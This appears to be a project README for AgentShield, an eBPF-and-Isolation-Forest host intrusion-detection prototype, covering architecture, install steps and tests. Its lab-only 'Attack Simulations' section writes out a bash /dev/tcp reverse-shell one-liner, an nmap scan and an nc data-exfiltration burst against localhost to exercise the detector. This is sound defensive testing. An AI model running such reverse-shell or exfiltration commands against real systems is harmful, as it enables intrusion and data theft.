# AgentShield – Autonomous Agent-Driven Kernel-Level Network Defense System

AgentShield is a production-oriented prototype that captures kernel/network behavior with eBPF, aggregates telemetry into behavioral windows, scores behavior with an Isolation Forest model, and automatically responds with alerts or process termination.

## Architecture

### 1. Kernel Layer (`agentshield/ebpf/monitor.c`)
Short explanation: hooks process execution and network syscalls (`execve`, `connect`, `sendto`, `recvfrom`) and emits compact telemetry records through a perf buffer.

How it connects forward: `loader.py` reads the perf buffer and turns each kernel event into a structured Python dictionary.

### 2. User Space Collector (`agentshield/collector/collector.py`)
Short explanation: loads the eBPF program with BCC, polls perf events asynchronously, serializes them as JSON, and falls back to a synthetic feed if eBPF is unavailable.

How it connects forward: JSON events are streamed into the feature engine via the main pipeline.

### 3. Feature Engine (`agentshield/feature_engine/features.py`)
Short explanation: maintains a per-PID sliding window and produces normalized behavioral features including connection frequency, unique IP count, byte transfer rate, interval variance, and high-risk port ratio.

How it connects forward: each feature vector is passed to the ML engine for anomaly inference.

### 4. ML Engine (`agentshield/ml_engine/model.py`)
Short explanation: wraps a scikit-learn Isolation Forest model, supports bootstrap training, online inference, and offline retraining from JSONL feature datasets.

How it connects forward: inference output feeds the decision engine with an anomaly score and label.

### 5. Decision Engine (`agentshield/decision_engine/decision.py`)
Short explanation: correlates the anomaly score with repeated anomalies, dangerous ports, data spikes, and process protection rules to choose `allow`, `alert`, or `kill`.

How it connects forward: the decision is sent to the response engine for enforcement and auditing.

### 6. Response Engine (`agentshield/response_engine/response.py`)
Short explanation: writes immutable-style audit records, emits console/webhook alerts, and kills unprotected malicious processes.

How it connects forward: response artifacts are persisted to `agentshield/logs/` and used by operators or SIEM tooling.

### 7. Service Layer (`agentshield/service/agentshield.service`)
Short explanation: systemd unit that runs AgentShield as root, restarts it on failure, and constrains filesystem access.

How it connects forward: the service launches `main.py` automatically at boot.

## Project Structure

```text
agentshield/
├── collector/
├── decision_engine/
├── ebpf/
├── feature_engine/
├── logs/
├── ml_engine/
├── response_engine/
└── service/
main.py
requirements.txt
```

## Dependencies

Ubuntu/Debian packages:

```bash
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-dev bpfcc-tools libbpfcc-dev linux-headers-$(uname -r)
```

Python packages:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

## Running the Prototype

### Local execution

```bash
sudo -E python3 main.py --verbose
```

If BCC/eBPF is unavailable, AgentShield automatically switches to a synthetic telemetry mode so the full pipeline can still be exercised.

### Install as a systemd service

```bash
sudo mkdir -p /opt/agentshield
sudo rsync -a ./ /opt/agentshield/
sudo cp agentshield/service/agentshield.service /etc/systemd/system/agentshield.service
sudo systemctl daemon-reload
sudo systemctl enable --now agentshield.service
sudo systemctl status agentshield.service
```

## Retraining the Isolation Forest

Prepare a JSONL file where each row contains the raw feature keys:

```json
{"connection_frequency": 12.3, "unique_ip_count": 4, "byte_transfer_rate": 8200, "interval_variance": 88000000000, "high_risk_port_ratio": 0.2}
```

Then retrain:

```bash
python3 -c "from pathlib import Path; from agentshield.ml_engine.model import AgentShieldModel; AgentShieldModel().retrain_from_jsonl(Path('dataset.jsonl'))"
```

## Attack Simulations

Only run these in an isolated lab or disposable VM.

### 1. Reverse shell

Listener:

```bash
nc -lvnp 4444
```

Simulated outbound shell:

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

### 2. Port scanning

```bash
nmap -Pn -p 1-1024 127.0.0.1
```

### 3. Data exfiltration burst

```bash
dd if=/dev/urandom bs=1K count=256 | nc 127.0.0.1 8080
```

These tests should trigger high-risk port ratios, connection spikes, or byte-transfer anomalies depending on baseline tuning.

## Testing Steps

### Static and unit-style validation

```bash
python3 -m compileall agentshield main.py
python3 - <<'PY'
from agentshield.feature_engine.features import SlidingWindowFeatureEngine
from agentshield.ml_engine.model import AgentShieldModel
from agentshield.decision_engine.decision import DecisionEngine

engine = SlidingWindowFeatureEngine(window_seconds=60, min_events=2)
model = AgentShieldModel()
decision_engine = DecisionEngine(anomaly_threshold=0.2)

events = [
    {"timestamp_ns": 1, "pid": 555, "uid": 1000, "event_type": "connect", "process_name": "python", "destination_ip": "10.0.0.1", "destination_port": 4444, "size": 2048},
    {"timestamp_ns": 2_000_000_000, "pid": 555, "uid": 1000, "event_type": "sendto", "process_name": "python", "destination_ip": "10.0.0.2", "destination_port": 4444, "size": 4096},
]
feature = None
for event in events:
    feature = engine.ingest(event)
assert feature is not None
inference = model.infer(feature.normalized_features, feature.raw_features)
decision = decision_engine.evaluate(feature, inference, events[-1])
print({"inference": inference, "decision": decision})
PY
```

### Runtime smoke test without kernel hooks

```bash
timeout 5 python3 main.py --poll-interval 0.1 --min-events 2 --anomaly-threshold 0.2
```

## Operational Notes

- Tune `--anomaly-threshold` and the normalization statistics to reduce false positives.
- Protected processes are never killed automatically; they are alerted only.
- Logs are written to `agentshield/logs/agentshield.log` and `agentshield/logs/incidents.jsonl` with restrictive permissions where possible.
- For true production deployment, replace the bootstrap baseline with environment-specific clean telemetry and add signed remote alert transport.

## Push / Deploy

The repository can be pushed with standard Git commands after commit:

```bash
git remote -v
git push origin <current-branch>
```

Deployment to your GitHub repository (`https://github.com/Jagannath-22/AGENT_SHIElD`) still requires valid local Git credentials or a configured deploy key/token in the execution environment.
